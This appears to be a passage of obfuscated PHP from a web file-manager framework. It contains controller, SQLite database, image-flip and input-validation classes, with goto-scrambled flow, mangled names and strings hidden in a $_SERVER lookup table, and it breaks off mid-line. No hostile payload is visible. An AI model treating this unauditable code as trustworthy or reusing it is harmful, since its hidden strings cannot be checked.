<?php
 goto cä√ß≠ÿ≤ç; bÑ◊–á¿–”: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto b¨∫ëÜê€¨; b¨∫ëÜê€¨: $B·™™îì‹â =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $in, $config; $this->config =& $config; goto B’«ÂÑùΩç; B∫¯Ñ∏îãü: $this->tpl = TEMPLATE . MOD . $B·™™îì‹â[8]; $this->_classObjectID = mt_rand(0, 10000); goto FôÓÏØàÔü; B’«ÂÑùΩç: $this->in =& $in; $this->values[$B·™™îì‹â[6]] =& $config; $this->values[$B·™™îì‹â[7]] =& $in; goto B∫¯Ñ∏îãü; FôÓÏØàÔü: } public function loadClass($B⁄≤ëõëì™) { if (1 === func_num_args()) { $this->{$B⁄≤ëõëì™} = new $B⁄≤ëõëì™(); } else { $f¿â„Øôúì = new ReflectionClass($B⁄≤ëõëì™); $f·¥ëÕçˆ = func_get_args(); array_shift($f·¥ëÕçˆ); $this->{$B⁄≤ëõëì™} = $f¿â„Øôúì->newInstanceArgs($f·¥ëÕçˆ); } return $this->{$B⁄≤ëõëì™}; } protected function assign($cÍïøﬂóÒ‘, $díŒÈ´Ìﬂü) { $this->values[$cÍïøﬂóÒ‘] = $díŒÈ´Ìﬂü; } protected function display($eÕπç£â´â) { ob_end_clean(); extract($this->values); require $this->tpl . $eÕπç£â´â; } } class DbSqliteBase extends Db { public function __construct($FÂõı›ªãŸ = '') { $DΩô¥â∞Áô =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!extension_loaded($DΩô¥â∞Áô[9])) { think_exception(think_lang($DΩô¥â∞Áô[10]) . $DΩô¥â∞Áô[11]); } if (!empty($FÂõı›ªãŸ)) { if (!isset($FÂõı›ªãŸ[$DΩô¥â∞Áô[12]])) { $FÂõı›ªãŸ[$DΩô¥â∞Áô[12]] = 438; } $this->config = $FÂõı›ªãŸ; if (empty($this->config[$DΩô¥â∞Áô[13]])) { $this->config[$DΩô¥â∞Áô[13]] = array(); } } } public function connect($Aùß“ÊÌ∫¯ = '', $aÀËœ∆÷†à = 0) { $Bë‰„“≤Ï =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($this->linkID[$aÀËœ∆÷†à])) { goto c˜Úúı⁄¿Á; dáïèÿ∫¥Î: $this->linkID[$aÀËœ∆÷†à] = $BØóÊÛêÌô($Aùß“ÊÌ∫¯[$Bë‰„“≤Ï[17]], $Aùß“ÊÌ∫¯[$Bë‰„“≤Ï[12]]); if (!$this->linkID[$aÀËœ∆÷†à]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto cßÍœÒÏÇ∞; cßÍœÒÏÇ∞: @sqlite_busy_timeout($this->linkID[$aÀËœ∆÷†à], 30000); if (1 != think_config($Bë‰„“≤Ï[18])) { unset($this->config); } goto eì©Ì·—⁄‡; c˜Úúı⁄¿Á: if (empty($Aùß“ÊÌ∫¯)) { $Aùß“ÊÌ∫¯ = $this->config; } $aõ¬∑≈§‘Ê = !empty($Aùß“ÊÌ∫¯[$Bë‰„“≤Ï[13]][$Bë‰„“≤Ï[14]]) ? $Aùß“ÊÌ∫¯[$Bë‰„“≤Ï[13]][$Bë‰„“≤Ï[14]] : $this->pconnect; $BØóÊÛêÌô = $aõ¬∑≈§‘Ê ? $Bë‰„“≤Ï[15] : $Bë‰„“≤Ï[16]; goto dáïèÿ∫¥Î; eì©Ì·—⁄‡: } return $this->linkID[$aÀËœ∆÷†à]; } public function free() { $this->queryID = null; } public function query($DÆ¯Üå◊À–) { goto F¿ô‚ÉØ”≤; F¿ô‚ÉØ”≤: $e÷ﬁóç∞î¡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d¿≈Ω°æó∞; d¿≈Ω°æó∞: $this->queryStr = $DÆ¯Üå◊À–; if ($this->queryID) { $this->free(); } think_action_status($e÷ﬁóç∞î¡[19], 1); goto eÂ≠®É¶°ö; E°‹√èìÜõ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $dß≈≤Û√êı = $this->getAll(); return $dß≈≤Û√êı; } goto d∞‘◊Ô™®∞; eÂ≠®É¶°ö: think_status($e÷ﬁóç∞î¡[20]); $this->queryID = sqlite_query($this->_linkID, $DÆ¯Üå◊À–); $this->debug(); goto E°‹√èìÜõ; d∞‘◊Ô™®∞: } public function execute($aÖÏáÃΩ«÷) { goto FÈ££»≤ÇØ; bº»ÒèáôÈ: think_status($Aë…∞‰Çá≤[20]); $c‰‘åê√ù = sqlite_exec($this->_linkID, $aÖÏáÃΩ«÷); $this->debug(); goto bùõÉæ±ÎÕ; c¶¨ª‚èﬁÿ: $this->queryStr = $aÖÏáÃΩ«÷; if ($this->queryID) { $this->free(); } think_action_status($Aë…∞‰Çá≤[21], 1); goto bº»ÒèáôÈ; bùõÉæ±ÎÕ: if (!1 === $c‰‘åê√ù) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto b‚Òéç€Ê˘; FÈ££»≤ÇØ: $Aë…∞‰Çá≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto c¶¨ª‚èﬁÿ; b‚Òéç€Ê˘: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Ä¿¡‡öóµŸﬂ‡][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fŸ´ïŒ—πÿ = sqlite_query($this->_linkID, $_SERVER[Ä¿¡‡öóµŸﬂ‡][23]); if (!$fŸ´ïŒ—πÿ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $cıÈ˘Ÿ◊°Ü = sqlite_query($this->_linkID, $_SERVER[Ä¿¡‡öóµŸﬂ‡][24]); if (!$cıÈ˘Ÿ◊°Ü) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $dêÚâÖÜ‹ì = array(); if ($this->numRows > 0) { for ($B·ÇÇÜÊ€Ë = 0; $B·ÇÇÜÊ€Ë < $this->numRows; $B·ÇÇÜÊ€Ë++) { $dêÚâÖÜ‹ì[$B·ÇÇÜÊ€Ë] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $dêÚâÖÜ‹ì; } public function getFields($FŸ±°¢Ë∫†) { $D’âÿ√Ó¡á =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $B¶‰ï‘áãÿ = $this->query($D’âÿ√Ó¡á[25] . $FŸ±°¢Ë∫† . $D’âÿ√Ó¡á[26]); $fÈΩå©„éπ = array(); if ($B¶‰ï‘áãÿ) { foreach ($B¶‰ï‘áãÿ as $a™¬ﬁ·≥£° => $FÎí€£°®À) { $fÈΩå©„éπ[$FÎí€£°®À[$D’âÿ√Ó¡á[27]]] = array($D’âÿ√Ó¡á[28] => $FÎí€£°®À[$D’âÿ√Ó¡á[27]], $D’âÿ√Ó¡á[29] => $FÎí€£°®À[$D’âÿ√Ó¡á[30]], $D’âÿ√Ó¡á[31] => (bool) ($FÎí€£°®À[$D’âÿ√Ó¡á[32]] === $D’âÿ√Ó¡á[33]), $D’âÿ√Ó¡á[34] => $FÎí€£°®À[$D’âÿ√Ó¡á[35]], $D’âÿ√Ó¡á[36] => strtolower($FÎí€£°®À[$D’âÿ√Ó¡á[37]]) == $D’âÿ√Ó¡á[38], $D’âÿ√Ó¡á[39] => strtolower($FÎí€£°®À[$D’âÿ√Ó¡á[40]]) == $D’âÿ√Ó¡á[41]); } } return $fÈΩå©„éπ; } public function getTables($DõòôÀ∑ﬁá = '') { $b–§ãóù€ö =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÕÙ¡ŸΩÉÒ = $this->query($b–§ãóù€ö[42] . $b–§ãóù€ö[43] . $b–§ãóù€ö[44]); $a ‡›ò®„í = array(); foreach ($bÕÙ¡ŸΩÉÒ as $EıÉå¬ﬁéÈ => $BÌ‚ê∏ùê ) { $a ‡›ò®„í[$EıÉå¬ﬁéÈ] = current($BÌ‚ê∏ùê ); } return $a ‡›ò®„í; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Fê◊üê›⁄£ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Cª∑ïÕ’∞Õ = sqlite_last_error($this->_linkID); $this->error = $Cª∑ïÕ’∞Õ . $Fê◊üê›⁄£[4] . sqlite_error_string($Cª∑ïÕ’∞Õ); if ($Fê◊üê›⁄£[33] != $this->queryStr) { $this->error .= LNG($Fê◊üê›⁄£[45]) . $this->queryStr; } think_trace($this->error, $Fê◊üê›⁄£[33], $Fê◊üê›⁄£[46]); return $this->error; } public function escapeString($b≥·≥ƒ¡¶≥) { return sqlite_escape_string($b≥·≥ƒ¡¶≥); } public function parseLimit($f§â¢⁄»ïª) { $cîÇﬂçºªâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $FØ∑º≠∆∞Ñ = $cîÇﬂçºªâ[33]; if (!empty($f§â¢⁄»ïª)) { $f§â¢⁄»ïª = explode($cîÇﬂçºªâ[47], $f§â¢⁄»ïª); if (count($f§â¢⁄»ïª) > 1) { $FØ∑º≠∆∞Ñ .= $cîÇﬂçºªâ[48] . $f§â¢⁄»ïª[1] . $cîÇﬂçºªâ[49] . $f§â¢⁄»ïª[0] . $cîÇﬂçºªâ[50]; } else { $FØ∑º≠∆∞Ñ .= $cîÇﬂçºªâ[48] . $f§â¢⁄»ïª[0] . $cîÇﬂçºªâ[50]; } } return $FØ∑º≠∆∞Ñ; } } class DbSqlite3Base extends Db { public function __construct($CÍÆ‹™¶€º = '') { $aÏ◊√˜°≥∑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!class_exists($aÏ◊√˜°≥∑[51])) { think_exception(think_lang($aÏ◊√˜°≥∑[10]) . $aÏ◊√˜°≥∑[52]); } if (!empty($CÍÆ‹™¶€º)) { if (!isset($CÍÆ‹™¶€º[$aÏ◊√˜°≥∑[12]])) { $CÍÆ‹™¶€º[$aÏ◊√˜°≥∑[12]] = 438; } $this->config = $CÍÆ‹™¶€º; if (empty($this->config[$aÏ◊√˜°≥∑[13]])) { $this->config[$aÏ◊√˜°≥∑[13]] = array(); } } } public function connect($D Õ‘ÎêØã = '', $aØ‡∑¢µŒ« = 0) { $BòÜ›’‚çâ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($this->linkID[$aØ‡∑¢µŒ«])) { if (empty($D Õ‘ÎêØã)) { $D Õ‘ÎêØã = $this->config; } $this->linkID[$aØ‡∑¢µŒ«] = new SQLite3($D Õ‘ÎêØã[$BòÜ›’‚çâ[17]]); if (!$this->linkID[$aØ‡∑¢µŒ«]) { think_exception($this->linkID[$aØ‡∑¢µŒ«]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$aØ‡∑¢µŒ«]->busyTimeout(30000); if (1 != think_config($BòÜ›’‚çâ[18])) { unset($this->config); } } return $this->linkID[$aØ‡∑¢µŒ«]; } public function free() { $this->queryID = null; } public function query($CÂˆÓ◊ÂÆ) { goto cöÎ¿¥ıÒá; cöÎ¿¥ıÒá: $CÒ›¨‘à≤– =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B¬¥ØîèΩõ; fä‡–é§áÕ: think_status($CÒ›¨‘à≤–[20]); $this->queryID = $this->_linkID->query($CÂˆÓ◊ÂÆ); $this->debug(); goto B§≤â∞≤ﬂ’; B¬¥ØîèΩõ: $this->queryStr = $CÂˆÓ◊ÂÆ; if ($this->queryID) { $this->free(); } think_action_status($CÒ›¨‘à≤–[19], 1); goto fä‡–é§áÕ; B§≤â∞≤ﬂ’: if (!1 === $this->queryID) { $this->error(); return !1; } else { $CÎÏŸË ¿Ô = $this->getAll(); $this->numRows = count($CÎÏŸË ¿Ô); return $CÎÏŸË ¿Ô; } goto f…º≠ÉÌ££; f…º≠ÉÌ££: } public function execute($eÙå∞Ò√¥∫) { goto c◊ıëêèπ‡; FŒ’øá≤åº: if (!1 === $dÀ”‰º≈È) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto EÀ©”ÙÜ ◊; f¯∆¡§†≈√: think_status($eΩò‚°éó¥[20]); $dÀ”‰º≈È = $this->_linkID->exec($eÙå∞Ò√¥∫); $this->debug(); goto FŒ’øá≤åº; bÀãë¶éπ›: $this->queryStr = $eÙå∞Ò√¥∫; if ($this->queryID) { $this->free(); } think_action_status($eΩò‚°éó¥[21], 1); goto f¯∆¡§†≈√; c◊ıëêèπ‡: $eΩò‚°éó¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto bÀãë¶éπ›; EÀ©”ÙÜ ◊: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ä¿¡‡öóµŸﬂ‡][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Bãﬂ‰≥÷≠ = $this->_linkID->query($_SERVER[Ä¿¡‡öóµŸﬂ‡][23]); if (!$Bãﬂ‰≥÷≠) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $CÖÍé∂Áü  = $this->_linkID->query($_SERVER[Ä¿¡‡öóµŸﬂ‡][24]); if (!$CÖÍé∂Áü ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $FÜîß‚ÑÂê = array(); while ($cƒ‰É”íÙ• = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $FÜîß‚ÑÂê[] = $cƒ‰É”íÙ•; } $this->queryID->reset(); return $FÜîß‚ÑÂê; } public function getFields($A“àÉ®€Íª) { $DﬂüŒŸÜè˜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C⁄ûö¨◊Üâ = $this->query($DﬂüŒŸÜè˜[25] . $A“àÉ®€Íª . $DﬂüŒŸÜè˜[26]); $BﬁÊ™∑Çå≈ = array(); if ($C⁄ûö¨◊Üâ) { foreach ($C⁄ûö¨◊Üâ as $F´ì˘Üüñ¿ => $fƒëèÔÚΩæ) { $BﬁÊ™∑Çå≈[$fƒëèÔÚΩæ[$DﬂüŒŸÜè˜[28]]] = array($DﬂüŒŸÜè˜[28] => $fƒëèÔÚΩæ[$DﬂüŒŸÜè˜[28]], $DﬂüŒŸÜè˜[29] => $fƒëèÔÚΩæ[$DﬂüŒŸÜè˜[29]], $DﬂüŒŸÜè˜[31] => (bool) ($fƒëèÔÚΩæ[$DﬂüŒŸÜè˜[31]] === $DﬂüŒŸÜè˜[33]), $DﬂüŒŸÜè˜[34] => $fƒëèÔÚΩæ[$DﬂüŒŸÜè˜[53]], $DﬂüŒŸÜè˜[36] => (bool) $fƒëèÔÚΩæ[$DﬂüŒŸÜè˜[54]], $DﬂüŒŸÜè˜[39] => (bool) $fƒëèÔÚΩæ[$DﬂüŒŸÜè˜[54]]); } } return $BﬁÊ™∑Çå≈; } public function getTables($eÈ•ﬂ‘©”◊ = '') { $B‚Ç≥Ÿ–€ä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÛ€≠—Ùã– = $this->query($B‚Ç≥Ÿ–€ä[42] . $B‚Ç≥Ÿ–€ä[43] . $B‚Ç≥Ÿ–€ä[44]); $eŒ≥ê©È“Ó = array(); foreach ($BÛ€≠—Ùã– as $fË÷®Ñ®Ô» => $A⁄Ç…Ñïı•) { $eŒ≥ê©È“Ó[$fË÷®Ñ®Ô»] = current($A⁄Ç…Ñïı•); } return $eŒ≥ê©È“Ó; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $a›ˆÊó‰¥û =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->error = $this->_linkID->lastErrorMsg(); if ($a›ˆÊó‰¥û[33] != $this->queryStr) { $this->error .= LNG($a›ˆÊó‰¥û[45]) . $this->queryStr; } think_trace($this->error, $a›ˆÊó‰¥û[33], $a›ˆÊó‰¥û[46]); return $this->error; } public function escapeString($a™ß∫â∆èï) { $Cö¶ıÑ°ªŸ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($this->_linkID) { return $this->_linkID->escapeString($a™ß∫â∆èï); } return str_ireplace($Cö¶ıÑ°ªŸ[55], $Cö¶ıÑ°ªŸ[56], $a™ß∫â∆èï); } public function parseLimit($C™ïÁ®¿·’) { $DíïÜ¶¥¯Ø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Eè˘òâπêã = $DíïÜ¶¥¯Ø[33]; if (!empty($C™ïÁ®¿·’)) { $C™ïÁ®¿·’ = explode($DíïÜ¶¥¯Ø[47], $C™ïÁ®¿·’); if (count($C™ïÁ®¿·’) > 1) { $Eè˘òâπêã .= $DíïÜ¶¥¯Ø[48] . $C™ïÁ®¿·’[1] . $DíïÜ¶¥¯Ø[49] . $C™ïÁ®¿·’[0] . $DíïÜ¶¥¯Ø[50]; } else { $Eè˘òâπêã .= $DíïÜ¶¥¯Ø[48] . $C™ïÁ®¿·’[0] . $DíïÜ¶¥¯Ø[50]; } } return $Eè˘òâπêã; } } goto FÂ•â‡ôÆ¶; c¥íçÁÛ¨ã: if (!function_exists($_SERVER[Ä¿¡‡öóµŸﬂ‡][1873])) { define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1874], 0); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1875], 1); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1876], 2); function imageflip($dâêåœ˘õ§, $BÙÊ±ÃœàÖ) { switch ($BÙÊ±ÃœàÖ) { case IMG_FLIP_HORIZONTAL: $eâÍâÔ∫§∑ = imagesx($dâêåœ˘õ§) - 1; $EÈ†Ø’§©∏ = $eâÍâÔ∫§∑ / 2; $C¿”à€õ⁄ˆ = imagesy($dâêåœ˘õ§); $EØÆÉï¬ËÖ = imageistruecolor($dâêåœ˘õ§) ? imagecreatetruecolor(1, $C¿”à€õ⁄ˆ) : imagecreate(1, $C¿”à€õ⁄ˆ); for ($BÊ∆à¡·Ù’ = 0; $BÊ∆à¡·Ù’ < $EÈ†Ø’§©∏; ++$BÊ∆à¡·Ù’) { imagecopy($EØÆÉï¬ËÖ, $dâêåœ˘õ§, 0, 0, $BÊ∆à¡·Ù’, 0, 1, $C¿”à€õ⁄ˆ); imagecopy($dâêåœ˘õ§, $dâêåœ˘õ§, $BÊ∆à¡·Ù’, 0, $eâÍâÔ∫§∑ - $BÊ∆à¡·Ù’, 0, 1, $C¿”à€õ⁄ˆ); imagecopy($dâêåœ˘õ§, $EØÆÉï¬ËÖ, $eâÍâÔ∫§∑ - $BÊ∆à¡·Ù’, 0, 0, 0, 1, $C¿”à€õ⁄ˆ); } break; case IMG_FLIP_VERTICAL: $F£§è÷√∆ø = imagesx($dâêåœ˘õ§); $E”¿Î–ï¶¿ = imagesy($dâêåœ˘õ§) - 1; $b›¬¯ÿ§Ã˘ = $E”¿Î–ï¶¿ / 2; $EØÆÉï¬ËÖ = imageistruecolor($dâêåœ˘õ§) ? imagecreatetruecolor($F£§è÷√∆ø, 1) : imagecreate($F£§è÷√∆ø, 1); for ($AÒˆ¿Ç˜Õ¡ = 0; $AÒˆ¿Ç˜Õ¡ < $b›¬¯ÿ§Ã˘; ++$AÒˆ¿Ç˜Õ¡) { imagecopy($EØÆÉï¬ËÖ, $dâêåœ˘õ§, 0, 0, 0, $AÒˆ¿Ç˜Õ¡, $F£§è÷√∆ø, 1); imagecopy($dâêåœ˘õ§, $dâêåœ˘õ§, 0, $AÒˆ¿Ç˜Õ¡, 0, $E”¿Î–ï¶¿ - $AÒˆ¿Ç˜Õ¡, $F£§è÷√∆ø, 1); imagecopy($dâêåœ˘õ§, $EØÆÉï¬ËÖ, 0, $E”¿Î–ï¶¿ - $AÒˆ¿Ç˜Õ¡, 0, 0, $F£§è÷√∆ø, 1); } break; case IMG_FLIP_BOTH: $F£§è÷√∆ø = imagesx($dâêåœ˘õ§); $C¿”à€õ⁄ˆ = imagesy($dâêåœ˘õ§); $EØÆÉï¬ËÖ = imagerotate($dâêåœ˘õ§, 180, 0); imagecopy($dâêåœ˘õ§, $EØÆÉï¬ËÖ, 0, 0, 0, 0, $F£§è÷√∆ø, $C¿”à€õ⁄ˆ); break; default: return; } imagedestroy($EØÆÉï¬ËÖ); } } if (!function_exists($_SERVER[Ä¿¡‡öóµŸﬂ‡][1877])) { function imagecreatefrombmp($dÕÍÀÁ…—±) { return ImageGdBMP::load($dÕÍÀÁ…—±); } } class Input { public static function getArray($A”ß‚´œ◊´) { goto A∫ÈÁæ˜™ı; A∫ÈÁæ˜™ı: $F„ œ∑Ñ ÷ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; global $in; $Aåÿﬁ©êÊ = array(); goto c‘çâ›µ”€; EªåáÆçæü: if (count($cŒﬁ∑‰Ñ†¯) > 0) { show_json(implode($F„ œ∑Ñ ÷[1882], $cŒﬁ∑‰Ñ†¯), !1); } return $Aåÿﬁ©êÊ; goto cÔ≈ƒ¬á‹Ï; c‘çâ›µ”€: $cŒﬁ∑‰Ñ†¯ = array(); $F∆”…ï⁄≤≥ = LNG($F„ œ∑Ñ ÷[1878]); foreach ($A”ß‚´œ◊´ as $e∞ÙïôÈª => $báÂ¿öÖÔÕ) { goto B≤â∏•†Éƒ; B≤â∏•†Éƒ: $b°¨ÔÓéËÑ = _get($báÂ¿öÖÔÕ, $F„ œ∑Ñ ÷[1249], $F∆”…ï⁄≤≥ . $F„ œ∑Ñ ÷[884] . $e∞ÙïôÈª); $cé—±÷Î¶ = $e∞ÙïôÈª; if (isset($báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1879]]) && $báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1879]]) { $cé—±÷Î¶ = $báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1879]]; } goto c˘≠ÖÙÕÆß; E◊åäÏâ√π: if (isset($báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1881]]) && !self::check($in[$e∞ÙïôÈª], $báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1881]], $CÒå∞ìêŒ‹)) { if (array_key_exists($F„ œ∑Ñ ÷[1880], $báÂ¿öÖÔÕ)) { if (!is_null($báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1880]])) { $Aåÿﬁ©êÊ[$cé—±÷Î¶] = $báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1880]]; } } else { $cŒﬁ∑‰Ñ†¯[] = $b°¨ÔÓéËÑ; } continue; } $Aåÿﬁ©êÊ[$cé—±÷Î¶] = $in[$e∞ÙïôÈª]; goto fÑ≈ä¡∆Ìü; c˘≠ÖÙÕÆß: if (!array_key_exists($e∞ÙïôÈª, $in)) { if (array_key_exists($F„ œ∑Ñ ÷[1880], $báÂ¿öÖÔÕ)) { if (!is_null($báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1880]])) { $Aåÿﬁ©êÊ[$cé—±÷Î¶] = $báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1880]]; } } else { if (isset($báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1881]])) { $cŒﬁ∑‰Ñ†¯[] = $b°¨ÔÓéËÑ; } } continue; } if (isset($báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1881]]) && $báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1881]] == $F„ œ∑Ñ ÷[282]) { $EœéòÒÓÕ” = json_decode($in[$e∞ÙïôÈª], !0); if (is_array($EœéòÒÓÕ”)) { $Aåÿﬁ©êÊ[$cé—±÷Î¶] = $EœéòÒÓÕ”; } else { if (array_key_exists($F„ œ∑Ñ ÷[1880], $báÂ¿öÖÔÕ)) { if (!is_null($báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1880]])) { $Aåÿﬁ©êÊ[$cé—±÷Î¶] = $báÂ¿öÖÔÕ[$F„ œ∑Ñ ÷[1880]]; } } else { $cŒﬁ∑‰Ñ†¯[] = $b°¨ÔÓéËÑ; } } continue; } $CÒå∞ìêŒ‹ = _get($báÂ¿öÖÔÕ, $F„ œ∑Ñ ÷[1016]); goto E◊åäÏâ√π; fÑ≈ä¡∆Ìü: } goto EªåáÆçæü; cÔ≈ƒ¬á‹Ï: } public static function reg($E∞ç¬ÔòèΩ = "\162\145\x71\165\x69\x72\145") { static $C”å¯Î‡à≈ = array("\162\145\161\x75\x69\x72\145" => "\x2e\x2b", "\156\x75\x6d\x62\145\x72" => "\x5c\x64\x2b", "\150\145\170" => "\133\60\x2d\71\x41\x2d\x46\x61\x2d\146\135\x2b", "\x69\156\164" => "\133\55\x5c\x2b\135\77\x5c\x64\53", "\142\x6f\x6f\x6c" => "\x30\174\61", "\146\x6c\157\141\x74" => "\x5b\55\134\53\135\77\x5c\x64\53\x28\x5c\x2e\x5c\x64\53\x29\77", "\145\156\147\154\x69\163\150" => "\x5b\x41\x2d\x5a\141\55\172\x20\135\x2b", "\x63\150\151\156\x65\x73\145" => "\133\134\170\x7b\x34\x65\x30\x30\x7d\55\134\170\173\71\146\141\x35\175\135\53", "\x68\141\163\103\150\151\x6e\145\163\x65" => "\57\50\x5b\134\170\173\x34\x65\x30\x30\175\x2d\x5c\170\x7b\71\x66\141\x35\175\135\53\51\x2f\165", "\x65\x6d\x61\x69\x6c" => "\134\x77\x2b\50\x5b\x5c\x2e\134\x2d\135\134\x77\x2b\x29\x2a\x5c\x40\134\x77\53\x28\133\134\x2e\x5c\x2d\x5d\x5c\167\x2b\x29\52\134\x2e\134\167\x2b", "\160\150\x6f\x6e\x65" => "\x31\x5b\x33\55\x39\x5d\134\x64\173\71\x7d", "\x74\145\x6c\x70\150\x6f\156\x65" => "\x28\x5c\50\134\x64\173\x33\x2c\x34\x7d\134\51\174\134\144\x7b\63\54\x34\175\55\174\x5c\x73\51\77\134\144\173\x37\x2c\x31\64\x7d", "\165\162\154" => "\50\150\x74\164\x70\174\x66\164\x70\174\150\x74\x74\160\163\x29\x3a\134\x2f\x5c\x2f\x5b\134\x77\134\x2d\137\135\x2b\50\134\56\x5b\134\167\134\55\x5f\135\x2b\51\x2b\50\x5b\x5c\x77\x5c\x2d\x5c\56\x2c\x40\77\x5e\x3d\x25\46\72\x5c\57\x7e\134\53\43\135\x2a\x5b\134\167\134\55\134\x40\x3f\x5e\x3d\45\46\x5c\57\x7e\x5c\x2b\x23\135\51\77", "\x75\162\x6c\x46\x75\x6c\154" => "\x5b\141\55\x7a\x41\x2d\x7a\x5d\x2b\x3a\x5c\57\134\x2f\x5b\x5e\x5c\163\135\52", "\x69\160" => "\50\134\x64\173\61\x2c\x33\x7d\134\56\x29\x7b\x33\175\50\x5c\x64\x7b\61\54\63\175\51", "\x7a\x69\160" => "\133\61\55\x39\135\134\x64\173\x35\x7d\x28\x3f\x21\x5c\x64\51", "\151\144\x43\141\x72\x64" => "\x28\x5c\144\173\61\65\x7d\x29\x7c\50\134\x64\x7b\61\67\175\50\x5c\x64\174\x58\174\x78\51\x29", "\143\x6f\154\x6f\x72" => "\x23\50\x5b\x30\55\x39\101\55\106\x61\x2d\x66\x5d\173\63\175\174\133\x30\55\x39\x41\x2d\x46\141\55\146\135\x7b\66\175\51", "\164\x69\x6d\145" => "\50\x5b\60\x2d\x31\x5d\134\x64\174\62\133\60\55\64\x5d\x29\72\x5b\x30\x2d\x35\x5d\134\x64", "\x64\x61\x74\x65" => "\x5c\x64\x7b\64\x7d\133\x2d\134\x2f\135\x3f\x28\x30\x5b\61\55\71\135\x7c\x31\133\60\x2d\62\x5d\51\133\55\x5c\x2f\x5d\x3f\x28\x5b\x30\55\62\135\134\x64\174\63\133\x30\55\61\x5d\51", "\144\141\x74\x65\x54\151\x6d\145" => "\134\144\173\64\x7d\133\55\x5c\x2f\x5d\77\50\60\133\61\55\71\135\174\x31\133\60\x2d\x32\135\x29\x5b\x2d\x5c\x2f\x5d\77\50\133\x30\x2d\62\135\x5c\x64\174\63\x5b\60\x2d\x31\x5d\51\x5c\x73\x2b\x28\133\60\55\x31\x5d\134\x64\x7c\x32\x5b\60\x2d\x34\135\51\72\133\60\x2d\x35\135\134\144", "\x70\141\x73\x73\167\157\x72\x64" => "\50\x3f\75\56\52\134\144\x29\50\77\75\56\52\x5b\141\x2d\x7a\x5d\51\50\x3f\x3d\56\52\x5b\101\x2d\132\135\x29\x2e\173\x38\54\62\60\x7d", "\x6b\145\171" => "\133\x41\55\132\x61\55\172\x30\55\x39\137\x5c\55\x5c\56\135\x2b", "\x6b\145\x79\x46\x75\154\x6c" => "\x5b\x41\55\132\141\55\172\x30\x2d\x39\x5f\134\x2d\x5c\x2e\x5c\163\54\x5d\53"); if (!$E∞ç¬ÔòèΩ) { return $C”å¯Î‡à≈; } return $C”å¯Î‡à≈[$E∞ç¬ÔòèΩ]; } public static function check($B∆∫æ´ûä∂, $BàﬁÈ¥≤∂ã, $DÛÉ‡∏Èµπ = null) { $a…§È¡È√¶ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; switch ($BàﬁÈ¥≤∂ã) { case $a…§È¡È√¶[7]: return in_array($B∆∫æ´ûä∂, $DÛÉ‡∏Èµπ); break; case $a…§È¡È√¶[1883]: return floatval($B∆∫æ´ûä∂) > 